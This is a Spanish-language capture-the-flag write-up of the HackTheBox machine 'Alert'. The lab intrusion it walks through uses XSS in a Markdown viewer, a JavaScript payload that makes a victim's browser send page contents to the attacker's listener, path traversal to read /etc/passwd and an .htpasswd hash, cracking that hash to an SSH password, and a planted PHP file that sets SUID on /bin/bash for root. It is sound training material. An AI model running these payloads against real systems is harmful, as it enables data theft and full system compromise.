---
title: "Máquina Alert"
description: "Resolución de la máquina Alert de HackTheBox"
tags: ["XSS", "Phishing", "AFR", "File permission abuse"]
categories: ["HackTheBox", "Easy", "Linux"]
logo: "/assets/writeups/alert/logo.png"
---

Un renderizador de Markdown contiene una vulnerabilidad XSS que podremos utilizar como mediador entre un usuario que lee mensajes y nosotros. Obtendremos una contraseña con esto y finalmente escalaremos privilegios abusando de los permisos de escritura que tenemos en los archivos de un servicio web interno.

## Reconocimiento

La máquina tiene dos puertos abiertos.

```bash
# Nmap 7.95 scan initiated Sat Nov 23 15:01:20 2024 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv -n 10.10.11.44
Nmap scan report for 10.10.11.44
Host is up, received user-set (0.17s latency).
Scanned at 2024-11-23 15:01:20 -04 for 184s
Not shown: 61340 closed tcp ports (reset), 4193 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Nov 23 15:04:24 2024 -- 1 IP address (1 host up) scanned in 183.36 seconds
```

El servidor HTTP nos redirige al dominio `alert.htb`, vamos a agregarlo a nuestro `/etc/hosts`:

```bash
10.10.11.44 alert.htb
```

La página web se trata de un renderizador de Markdown:

![Web](/assets/writeups/alert/1.png)

Evidentemente por el archivo de la URL podemos saber ya que esto usa PHP. Intentar hacer un path traversal en el parámetro `page` no nos lleva a nada.

También tenemos una sección de contacto:

![Contact](/assets/writeups/alert/2.png)

Del resto no hay nada interesante, asi que veamos que hacemos por acá.

## Intrusión

Si renderizamos un markdown común, veremos que en efecto nos lo procesa... y si intentamos "salirnos" del contexto de Markdown cerrando la etiqueta HTML correspondiente y agregando otra como un `<script>` obtendremos un XSS:

```md
# uwu owo</h1><script>alert('uwu')</script>
```

![alt text](/assets/writeups/alert/3.png)

En el botón de la esquina derecha inferior, nos da un enlace para compartir este documento malicioso: `http://alert.htb/visualizer.php?link_share=67ebd35a23aab0.34082396.md`.

Vale... recordemos que tenemos una sección de contacto para enviarle un mensaje a alguien, ¿y si le enviamos el enlace?

Vamos a generar otro markdown pero con este contenido:

```md
# uwu owo</h1><script>fetch("http://10.10.16.x:8000/test")</script>
```

Lo que va a hacer es enviarle una petición HTTP a un servidor que dejaremos en escucha en nuestro equipo en el puerto 8000/tcp. Al subir esto y enviar el enlace en el formulario anteriormente mencionado, veremos que de a primeras esto no funciona porque

![xd](/assets/writeups/alert/4.png)

El procesador markdown nos está convirtiendo esto a un hipervínculo.

Pero esto podemos solucionarlo simplemente codificando la entrada en base64 y decodificarla con `atob` en el parámetro de la función `fetch`. Al hacerlo ahora si veremos algo en nuestro servidor de alguien más al enviar el enlace al formulario.

![Look this](/assets/writeups/alert/5.png)

```bash
❯ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.44 - - [01/Apr/2025 08:06:59] code 404, message File not found
10.10.11.44 - - [01/Apr/2025 08:06:59] "GET /test HTTP/1.1" 404 -
```

Tendremos una dificultad al explotar esto, y es que las cookies tienen la propiedad `HttpOnly` en true. Por lo que tendremos que abusar de XSS haciendo que el usuario que sea que esté leyendo el mensaje haga cosas por nosotros mediante JavaScript, como ver recursos que nosotros no podemos ver.

Vamos a tener que programar tanto un script como para hacer cosas y un servidor que reciba los datos que el script logre filtrar haciendo sus cosas. Yo tengo una herramienta propia programada en Go para este tipo de situaciones, pero tu deberás programarte algo o buscar alguna solución por sitios como GitHub. 

Para el script podemos utilizar lo siguiente:

```bash
async function uwu(){
  let resp = await fetch("http://alert.htb/");
  let txt = await resp.text();

  await fetch(`<url para enviar datos>`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({data: btoa(encodeURI(txt))})
  });
}

uwu();
```

Convirtiendolo a base64 y dejando el archivo Markdown como:

```md
# uwu owo</h1><script>eval(atob("<base 64 data>"))</script>
```
{: file="test.md" }

Recibiremos el contenido HTML del index que ve el usuario después de enviar el enlace del archivo de arriba por el formulario:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Markdown Viewer</h1><div class="form-container">
            <form action="visualizer.php" method="post" enctype="multipart/form-data">
                <input type="file" name="file" accept=".md" required>
                <input type="submit" value="View Markdown">
            </form>
          </div>    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

Hay una sección nueva de mensajes cuyo contenido es:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>
    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>
```

Esto es lo que está usando el usuario para ver los mensajes que le enviamos a través del formulario del contacto.

Vemos que el archivo PHP messages nos permite indicar un archivo a leer... y probando un path traversal para leer el `/etc/passwd`:

```html
<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
</pre>
```

Podemos leer arbitrariamente archivos de la máquina.

Viendo la configuración del servidor web ubicada en `/etc/apache2/sites-enabled/000-default.conf` podemos percatarnos de un subdominio con protección:

```html
<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>
```

El archivo `.htpasswd` contiene una contraseña hasheada:

```bash
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>
```

dicha contraseña es débil:

```bash
❯ hashcat --show hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
```

y sirve para acceder por ssh. Como vimos en el `/etc/passwd`, `albert` es un usuario del sistema.

```bash
❯ /usr/bin/ssh albert@alert.htb
albert@alert.htb password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-200-generic x86_64)

... [snip]

Last login: Tue Nov 19 14:19:09 2024 from 10.10.14.23
albert@alert:~$
```

Dentro del directorio personal encontraremos la primera flag.

```bash
albert@alert:~$ ls -la
total 28
drwxr-x--- 3 albert albert 4096 Nov 19 14:19 .
drwxr-xr-x 4 root   root   4096 Oct 12 02:21 ..
lrwxrwxrwx 1 albert albert    9 Mar 16  2024 .bash_history -> /dev/null
-rw-r--r-- 1 albert albert  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 albert albert 3771 Feb 25  2020 .bashrc
drwx------ 2 albert albert 4096 Mar  8  2024 .cache
-rw-r--r-- 1 albert albert  807 Feb 25  2020 .profile
-rw-r----- 1 root   albert   33 Apr  1 16:46 user.txt
albert@alert:~$ cat user.txt
4e3c573aaceea569ea7538575f******
```

## Escalada de privilegios

Hay un servicio web interno corriendo en el puerto 8080:

```bash
albert@alert:~$ curl -v http://127.0.0.1:8080
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Host: 127.0.0.1:8080
< Date: Tue, 01 Apr 2025 19:11:27 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.24
< Content-type: text/html; charset=UTF-8
... [snip]
```

Se trata de una instancia de [website-monitor](https://neatnik.net/dispenser/?project=website-monitor).

En `/opt/website-monitor` podemos ver los archivos del servicio:

```bash
albert@alert:/opt/website-monitor$ ls -al
total 96
drwxrwxr-x 7 root root        4096 Oct 12 01:07 .
drwxr-xr-x 4 root root        4096 Oct 12 00:58 ..
drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
drwxrwxr-x 8 root root        4096 Oct 12 00:58 .git
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
```

El usuario `albert` es parte del grupo `management`:

```bash
albert@alert:/opt/website-monitor$ id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

y dicho grupo tiene permisos de escritura en el directorio. Al ser PHP podemos simplemente crear un script que nos ejecute un comando, y root es quien está corriendo el servidor web en cuestión. También hay una tarea cron viendo el directorio que podemos editar:

```bash
albert@alert:/tmp$ ps -faux
... [snip]
root         991  0.0  0.0   6816  2928 ?        Ss   16:45   0:00 /usr/sbin/cron -f
root        1004  0.0  0.0   8360  3412 ?        S    16:45   0:00  \_ /usr/sbin/CRON -f
root        1024  0.0  0.0   2608   600 ?        Ss   16:45   0:00  |   \_ /bin/sh -c /root/scripts/php_bot.sh
root        1026  0.0  0.0   6892  3288 ?        S    16:45   0:00  |       \_ /bin/bash /root/scripts/php_bot.sh
root        1031  0.0  0.0   2636   792 ?        S    16:45   0:00  |           \_ inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
root        1032  0.0  0.0   6892   224 ?        S    16:45   0:00  |           \_ /bin/bash /root/scripts/php_bot.sh
... [snip]
root        1007  0.0  0.6 207156 26548 ?        Ss   16:45   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
... [snip]
```

Entonces, si colocamos un archivo con el siguiente contenido dentro de la carpeta en la que tenemos permisos:

```php
<?php
  system("chmod u+s /bin/bash");
?>
```
{: file="test.php" }


y le mandamos una petición al mismo desde el servidor web:

```bash
albert@alert:/opt/website-monitor/config$ curl -v http://127.0.0.1:8080/config/config.php
*   Trying 127.0.0.1:8080...
* TCP_NODELAY set
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /config/config.php HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Host: 127.0.0.1:8080
< Date: Tue, 01 Apr 2025 19:54:32 GMT
< Connection: close
< X-Powered-By: PHP/7.4.3-4ubuntu2.24
< Content-type: text/html; charset=UTF-8
< 
* Closing connection 0
albert@alert:/opt/website-monitor/config$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Ahora podemos simplemente hacer `bash -p` y tomar la última flag.

```bash
albert@alert:/opt/website-monitor/config$ bash -p
bash-5.0# cd /root
bash-5.0# ls -la
total 32
drwx------  5 root root 4096 Apr  1 16:46 .
drwxr-xr-x 18 root root 4096 Nov 14 10:55 ..
lrwxrwxrwx  1 root root    9 Oct 12 03:03 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Nov  5 11:49 .cache
drwxr-xr-x  3 root root 4096 Nov 19 14:21 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Apr  1 16:46 root.txt
drwxr-xr-x  3 root root 4096 Nov  6 12:37 scripts
bash-5.0# cat root.txt
40dc25997277403be2896b30eb******
```